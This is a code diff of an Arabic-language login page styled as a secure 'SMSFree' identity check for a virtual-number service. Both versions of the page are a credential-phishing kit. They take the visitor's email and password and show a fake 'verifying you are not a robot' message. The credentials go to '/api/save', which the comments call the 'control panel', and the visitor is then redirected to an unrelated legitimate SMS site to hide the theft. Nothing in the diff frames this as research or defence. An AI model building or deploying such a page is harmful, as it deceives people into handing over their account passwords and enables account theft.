@@ -1,161 +1,93 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - نظام التحقق الآمن</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>SMSFree - دخول آمن</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-dark: #0a0e17; --card-bg: #141b2b;
-            --primary-glow: #00f2fe; --secondary-glow: #4facfe;
-            --text-main: #ffffff; --text-muted: #8b9bb4;
-            --placeholder: rgba(0, 242, 254, 0.4);
-            --border: rgba(255, 255, 255, 0.05);
-            --error: #ff4757; --ban-bg: #000000;
-        }
-
-        body {
-            margin: 0; padding: 0; font-family:  Cairo , sans-serif;
-            background-color: var(--bg-dark);
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; color: var(--text-main); overflow: hidden;
-        }
-
-        .premium-card {
-            background-color: var(--card-bg); width: 90%; max-width: 400px;
-            padding: 45px 35px; border-radius: 28px; text-align: center;
-            border: 1px solid var(--border); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-        }
-
-        .logo-circle {
-            width: 100px; height: 100px; background: #0d121c;
-            border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            margin: 0 auto 30px; border: 1px solid var(--border);
-            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2);
-        }
-
-        input {
-            width: 100%; padding: 18px; margin-bottom: 15px;
-            background: rgba(255, 255, 255, 0.02); border: 1.5px solid var(--border);
-            border-radius: 15px; color: #fff; font-family:  Cairo ; box-sizing: border-box;
-            transition: 0.3s;
-        }
-
-        input::placeholder { color: var(--placeholder); }
-        input:focus { border-color: var(--secondary-glow); outline: none; background: rgba(0, 242, 254, 0.03); }
-
-        /* رسائل الخطأ والحظر */
-        #statusBox {
-            font-size: 13px; font-weight: 700; padding: 12px; border-radius: 12px;
-            margin-bottom: 20px; display: none;
-        }
-        .msg-error { background: rgba(255, 71, 87, 0.1); color: var(--error); border: 1px solid var(--error); }
-        .msg-ban { background: var(--ban-bg); color: #ffbc00; border: 2px solid #ffbc00; animation: shake 0.3s infinite; }
-
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
-
-        button {
-            width: 100%; padding: 18px; font-weight: 800; font-size: 17px;
-            background: linear-gradient(135deg, var(--secondary-glow), var(--primary-glow));
-            border: none; border-radius: 15px; cursor: pointer; color: #0a0e17;
-            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.2);
-        }
-
-        button:disabled { opacity: 0.4; cursor: not-allowed; }
-
-        .footer-rights {
-            margin-top: 30px; font-size: 11px; color: var(--text-muted);
-            border-top: 1px solid var(--border); padding-top: 15px;
-        }
+        body { background-color: #0a0e17; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
+        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; box-shadow: 0 0 15px rgba(0,242,254,0.2); }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #4facfe; }
+        input::placeholder { color: rgba(0, 242, 254, 0.4); }
+        #msg { padding: 10px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; }
+        .err { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
+        .ban { background: #000; color: #ffbc00; border: 1px solid #ffbc00; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; }
+        button:disabled { opacity: 0.3; }
+        .footer { margin-top: 25px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="premium-card">
-        <div class="logo-circle"><span style="font-weight:800; color:#fff;">SMSFree</span></div>
-        <h2 style="font-size: 22px; margin-bottom: 25px;">تأكيد الهوية الرقمية</h2>
+    <div class="card">
+        <div class="logo"><strong>SMSFree</strong></div>
+        <h2 style="margin-bottom: 20px;">تأكيد الهوية الرقمية</h2>
+        
+        <div id="msg"></div>
 
-        <div id="statusBox"></div>
-
-        <form id="authForm">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني (example@mail.com)" required>
-            <input type="password" id="passInput" placeholder="كلمة السر" required>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني (example@mail.com)" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
             
-            <div id="vZone" style="display:none; margin-bottom:15px; color:var(--secondary-glow); font-size:13px;">
-                <span>⏳ جاري التحقق من الهوية...</span>
+            <div id="loading" style="display:none; margin-bottom:15px; color:#4facfe;">
+                <span>⌛ جاري التحقق من أنك لست روبوت...</span>
             </div>
 
-            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
+            <button type="submit" id="btn">تفعيل الحساب الآن</button>
         </form>
 
-        <div class="footer-rights">
+        <div class="footer">
             © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.
         </div>
     </div>
 
     <script>
-        let attempts = 0;
-        let isBanned = false;
-        const form = document.getElementById( authForm );
-        const statusBox = document.getElementById( statusBox );
-        const btn = document.getElementById( pageBtn );
+        let fails = 0;
+        const form = document.getElementById('loginForm');
+        const m = document.getElementById('msg');
+        const b = document.getElementById('btn');
 
         form.onsubmit = async (e) => {
             e.preventDefault();
-            if (isBanned) return;
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
 
-            const user = document.getElementById( userInput ).value;
-            const pass = document.getElementById( passInput ).value;
-
-            // 1. تحقق صارم من صيغة البريد الإلكتروني وكلمة السر
-            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailPattern.test(user) || pass.length < 6) {
-                attempts++;
-                
-                if (attempts >= 3) {
-                    applyBan();
+            // شرط التحقق: يجب وجود @ وباسورد أكثر من 5 حروف
+            if (!u.includes('@') || p.length < 6) {
+                fails++;
+                if (fails >= 3) {
+                    b.disabled = true;
+                    m.innerText = "لقد تم حظرك بسبب محاولات الخاطئة";
+                    m.className = "ban"; m.style.display = "block";
+                    setTimeout(() => { b.disabled = false; m.style.display = "none"; fails = 0; }, 3000);
                 } else {
-                    showStatus("يرجى كتابة البريد وكلمة السر بطريقة صحيحة", "msg-error");
+                    m.innerText = "يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
+                    m.className = "err"; m.style.display = "block";
                 }
                 return;
             }
 
-            // 2. إذا البيانات صحيحة يتم الإرسال والتحقق الوهمي
-            btn.disabled = true;
-            statusBox.style.display =  none ;
-            document.getElementById( vZone ).style.display =  block ;
+            // إذا البيانات صحيحة
+            b.disabled = true;
+            m.style.display = "none";
+            document.getElementById('loading').style.display = "block";
 
-            // إرسال البيانات للوحة
-            fetch( /api/save , {
-                method:  POST ,
-                headers: { Content-Type :  application/json },
-                body: JSON.stringify({ user, pass })
-            });
+            // إرسال للوحة التحكم
+            try {
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user: u, pass: p })
+                });
+            } catch(e) {}
 
+            // الانتقال الإجباري بعد ثانيتين
             setTimeout(() => {
                 window.location.href = "https://receive-smss.com/";
             }, 2000);
         };
-
-        function showStatus(msg, className) {
-            statusBox.innerText = msg;
-            statusBox.className = className;
-            statusBox.style.display =  block ;
-        }
-
-        function applyBan() {
-            isBanned = true;
-            btn.disabled = true;
-            showStatus("لقد تم حظرك بسبب محاولات الخاطئة", "msg-ban");
-            
-            setTimeout(() => {
-                isBanned = false;
-                btn.disabled = false;
-                statusBox.style.display =  none ;
-                attempts = 0; // تصفير المحاولات بعد فك الحظر
-            }, 3000); // حظر لمدة 3 ثوانٍ
-        }
     </script>
 </body>
 </html>
